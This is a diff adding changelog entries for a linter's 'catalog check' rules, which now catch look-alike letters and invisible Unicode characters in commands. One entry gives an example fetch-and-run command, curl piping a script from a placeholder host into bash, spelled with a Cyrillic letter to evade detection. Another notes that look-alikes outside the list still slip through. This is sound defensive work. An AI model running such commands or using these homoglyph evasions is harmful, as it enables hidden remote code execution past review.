@@ -1,0 +1,5 @@
+### Fixed
+
+- **`catalog check` reads look-alike letters in commands and model IDs** — `pipe-to-shell`, `permission-bypass-flag`, `install-unpinned` and `legacy-model-id` now treat a Cyrillic or Greek look-alike letter, or a fullwidth letter, as its Latin letter. `сurl https://x.example/i.sh | bash` with a Cyrillic `с` was `ok` before; it is now a `pipe-to-shell` warning (#960). The letter list is short, so a look-alike outside it still escapes.
+- **`hidden-unicode` reports bidi marks in Latin text** — U+200E, U+200F and U+061C are reported unless the nearest letter on either side is a Hebrew or Arabic one (#960).
+- **`hidden-unicode` reports more invisible characters** — a soft hyphen (U+00AD), U+2061 to U+2064, U+206A to U+206F, stray variation selectors and the blank fillers U+034F, U+180E, U+115F, U+1160, U+3164, U+FFA0 and U+2800 are reported. Selectors after an emoji, a symbol, an ideograph or a keycap base, and fillers inside Hangul (jamo, Extended-A/B, syllables, halfwidth), Braille or non-ASCII text, are not (#960).
